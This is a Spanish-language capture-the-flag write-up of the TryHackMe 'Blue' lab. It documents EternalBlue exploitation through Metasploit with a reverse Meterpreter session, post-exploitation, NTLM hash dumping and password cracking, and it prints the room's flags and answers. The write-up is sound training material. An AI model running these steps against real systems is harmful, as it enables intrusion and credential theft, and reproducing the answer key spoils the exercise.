# TryHackMe - Blue

## Información general

- **Máquina:** Blue
- **IP objetivo:** 10.65.163.160
- **Plataforma:** TryHackMe
- **Máquina atacante:** Kali Linux en VMware
- **Objetivo:** Completar las fases de Recon, Gain Access, Escalate, Cracking y Find Flags

---

## 1. Preparación del entorno

Para organizar el laboratorio y documentar cada paso, se creó una estructura de trabajo dedicada a la máquina Blue.

### Comandos ejecutados

```bash
mkdir -p ~/THM/Blue/{scans,notes,loot,exploit,screenshots}
touch ~/THM/Blue/notes/{notes.md,commands.md,findings.md}
cd ~/THM/Blue
script ~/THM/Blue/notes/terminal_session.log
```

### Estructura creada

- `scans/` → resultados de escaneos y enumeración
- `notes/` → notas, hallazgos y bitácora
- `loot/` → hashes, credenciales y artefactos obtenidos
- `exploit/` → notas relacionadas con explotación
- `screenshots/` → evidencias visuales

---

## 2. Reconocimiento inicial

La máquina Blue advertía que podía no responder a ICMP, por lo que el reconocimiento se realizó con `-Pn` para evitar depender del ping.

### Escaneo inicial con Nmap

```bash
sudo nmap -Pn -sV -sC 10.65.163.160 -oN ~/THM/Blue/scans/nmap_initial.nmap
```

### Resultados del escaneo

Puertos abiertos detectados:

- `135/tcp` → `msrpc`
- `139/tcp` → `netbios-ssn`
- `445/tcp` → `microsoft-ds`
- `3389/tcp` → `tcpwrapped`
- `49152/tcp` → `msrpc`
- `49153/tcp` → `msrpc`
- `49154/tcp` → `msrpc`
- `49161/tcp` → `msrpc`

### Información identificada del sistema

- **Hostname:** `JON-PC`
- **Sistema operativo:** `Windows 7 Professional 7601 Service Pack 1`
- **Arquitectura:** `x64`
- **Workgroup:** `WORKGROUP`

### Análisis

La combinación de:

- Windows 7 SP1
- SMB expuesto en el puerto 445
- firma SMB no requerida

sugería fuertemente la presencia de la vulnerabilidad **MS17-010 (EternalBlue)**.

---

## 3. Verificación de la vulnerabilidad

Para confirmar la hipótesis, se ejecutó el script de Nmap específico para MS17-010.

```bash
sudo nmap --script smb-vuln-ms17-010 -p445 10.65.163.160 -oN ~/THM/Blue/scans/nmap_ms17-010.nmap
```

### Resultado

El host fue identificado como **vulnerable a MS17-010**, confirmando que el vector principal de explotación sería EternalBlue.

---

## 4. Explotación con Metasploit

Se utilizó Metasploit para explotar la vulnerabilidad con el módulo de EternalBlue.

```text
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.65.163.160
set LHOST 192.168.225.140
set VERIFY_ARCH true
set VERIFY_TARGET true
run
```

### Observaciones durante la explotación

- El exploit detectó correctamente que el objetivo era `Windows 7 Professional 7601 Service Pack 1 x64`.
- La explotación completó exitosamente el overwrite de EternalBlue.
- Se abrió una sesión **Meterpreter x64/windows**.

### Resultado

Se obtuvo acceso exitoso al sistema remoto.

---

## 5. Validación del acceso

Una vez abierta la sesión Meterpreter, se verificó el sistema comprometido con los siguientes comandos:

```text
sysinfo
getuid
```

### Resultado de `sysinfo`

- **Computer:** `JON-PC`
- **OS:** `Windows 7 (6.1 Build 7601, Service Pack 1)`
- **Architecture:** `x64`
- **Meterpreter:** `x64/windows`

### Resultado de `getuid`

```text
Server username: NT AUTHORITY\SYSTEM
```

### Conclusión

No fue necesaria una escalada de privilegios manual adicional, ya que el exploit entregó acceso directamente como:

- **`NT AUTHORITY\SYSTEM`**

---

## 6. Enumeración inicial post-explotación

Se abrió una shell para recolectar información básica del sistema y de los usuarios locales.

```text
shell
whoami
hostname
ipconfig
net user
net localgroup administrators
```

### Información relevante obtenida

- **Usuario actual:** `nt authority\system`
- **Hostname:** `Jon-PC`
- **IP del objetivo:** `10.65.163.160`
- **Usuarios locales identificados:**
  - `Administrator`
  - `Guest`
  - `Jon`

### Grupo local Administrators

El grupo local de administradores contenía:

- `Administrator`
- `Jon`

Esto confirmó que `Jon` tenía privilegios administrativos sobre la máquina.

---

## 7. Conversión de shell a Meterpreter

Aunque ya se contaba con una sesión Meterpreter funcional, la room pedía investigar y utilizar el módulo de post-explotación para convertir una shell a Meterpreter.

### Módulo utilizado

```text
post/multi/manage/shell_to_meterpreter
```

### Opción requerida a modificar

```text
SESSION
```

### Ejecución

```text
background
use post/multi/manage/shell_to_meterpreter
show options
set SESSION 1
run
```

### Resultado

Se abrió una nueva sesión Meterpreter:

```text
Meterpreter session 2 opened
```

Posteriormente se interactuó con la nueva sesión:

```text
sessions -i 2
getuid
```

Y se confirmó nuevamente:

```text
Server username: NT AUTHORITY\SYSTEM
```

---

## 8. Listado de procesos y migración

Se listaron los procesos activos de la máquina mediante:

```text
ps
```

Inicialmente se identificó un proceso SYSTEM hacia la parte baja del listado:

- **PID 3064** → `SearchIndexer.exe`

Se intentó migrar a ese proceso:

```text
migrate 3064
```

### Resultado del primer intento

La migración falló con el error:

```text
core_migrate: Operation failed: 1300
```

Luego se probó con otro proceso SYSTEM más estable:

- **PID 1292** → `spoolsv.exe`

```text
migrate 1292
```

### Resultado final

```text
Migration completed successfully.
```

---

## 9. Extracción de hashes

Con privilegios SYSTEM, se procedió a extraer los hashes locales mediante:

```text
hashdump
```

### Hashes obtenidos

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Los hashes se guardaron en:

```text
~/THM/Blue/loot/hashes.txt
```

---

## 10. Cracking de credenciales

Se intentó utilizar `john` con la wordlist `rockyou.txt`, pero inicialmente el archivo no estaba disponible descomprimido.

### Verificación de wordlists

```bash
ls /usr/share/wordlists
```

Se identificó la presencia de:

```text
rockyou.txt.gz
```

### Descompresión de la wordlist

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

### Cracking con John the Ripper

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ~/THM/Blue/loot/hashes.txt
```

### Resultado del cracking

```text
alqfna22 (Jon)
```

### Interpretación adicional

El hash de `Administrator` correspondía a una contraseña vacía:

```text
31d6cfe0d16ae931b73c59d7e0c089c0
```

### Credenciales obtenidas

- **Jon:** `alqfna22`
- **Administrator:** contraseña vacía
- **Guest:** contraseña vacía o deshabilitada según el contexto de la máquina

---

## 11. Búsqueda de flags

La room requería encontrar tres flags ubicadas en rutas representativas del sistema Windows.

### Flag 1

Pista: **system root**

```text
type C:\flag1.txt
```

#### Contenido

```text
flag1{access_the_machine}
```

---

### Flag 2

Pista: **ubicación donde Windows almacena contraseñas**

```text
type C:\Windows\System32\config\flag2.txt
```

#### Contenido

```text
flag2{sam_database_elevated_access}
```

---

### Flag 3

Pista: **ubicación interesante para loot, asociada a documentos del administrador**

```text
type C:\Users\Jon\Documents\flag3.txt
```

#### Contenido

```text
flag3{admin_documents_can_be_valuable}
```

---

## 12. Respuestas clave de la room

### Módulo para conversión a Meterpreter

```text
post/multi/manage/shell_to_meterpreter
```

### Opción requerida

```text
SESSION
```

### Usuario con privilegios elevados

```text
NT AUTHORITY\SYSTEM
```

### PID identificado inicialmente para migración

```text
3064
```

### Comando solicitado por la room

```text
migrate 3064
```

### PID con migración exitosa

```text
1292
```

### Contraseña crackeada del usuario Jon

```text
alqfna22
```

### Flags finales

```text
flag1{access_the_machine}
flag2{sam_database_elevated_access}
flag3{admin_documents_can_be_valuable}
```

---

## 13. Evidencias sugeridas

Se recomienda conservar capturas o evidencia textual de:

- resultado de `nmap_initial.nmap`
- confirmación de `smb-vuln-ms17-010`
- ejecución exitosa de EternalBlue
- salida de `sysinfo`
- salida de `getuid`
- `hashdump`
- cracking con `john`
- lectura de las tres flags
- captura final de la room completada

---

## 14. Conclusiones

### Hallazgos principales

- La máquina Blue estaba basada en **Windows 7 SP1 x64**.
- El servicio SMB expuesto en `445/tcp` permitió enfocar el ataque en **MS17-010**.
- La explotación con **EternalBlue** fue exitosa y proporcionó acceso como **SYSTEM**.
- Se logró extraer hashes de los usuarios locales.
- Se crackeó la contraseña del usuario `Jon`.
- Se localizaron correctamente las tres flags de la room.

### Lecciones aprendidas

- Cuando una máquina no responde a ping, `-Pn` es esencial durante la fase de reconocimiento.
- Windows 7 SP1 con SMB expuesto sigue siendo un indicador clásico para probar EternalBlue.
- No toda migración de proceso funciona; conviene probar varios procesos SYSTEM estables.
- Documentar el laboratorio desde el inicio facilita el análisis posterior y la elaboración del writeup final.

---

## 15. Comandos ejecutados durante el laboratorio

### Preparación

```bash
mkdir -p ~/THM/Blue/{scans,notes,loot,exploit,screenshots}
touch ~/THM/Blue/notes/{notes.md,commands.md,findings.md}
cd ~/THM/Blue
script ~/THM/Blue/notes/terminal_session.log
```

### Reconocimiento

```bash
sudo nmap -Pn -sV -sC 10.65.163.160 -oN ~/THM/Blue/scans/nmap_initial.nmap
sudo nmap --script smb-vuln-ms17-010 -p445 10.65.163.160 -oN ~/THM/Blue/scans/nmap_ms17-010.nmap
```

### Explotación

```text
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.65.163.160
set LHOST 192.168.225.140
set VERIFY_ARCH true
set VERIFY_TARGET true
run
```

### Post-explotación

```text
sysinfo
getuid
shell
whoami
hostname
ipconfig
net user
net localgroup administrators
hashdump
ps
migrate 3064
migrate 1292
```

### Conversión de sesión

```text
background
use post/multi/manage/shell_to_meterpreter
show options
set SESSION 1
run
sessions
sessions -i 2
getuid
```

### Cracking

```bash
ls /usr/share/wordlists
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ~/THM/Blue/loot/hashes.txt
john --show --format=NT ~/THM/Blue/loot/hashes.txt
```

### Flags

```text
type C:\flag1.txt
type C:\Windows\System32\config\flag2.txt
type C:\Users\Jon\Documents\flag3.txt
```
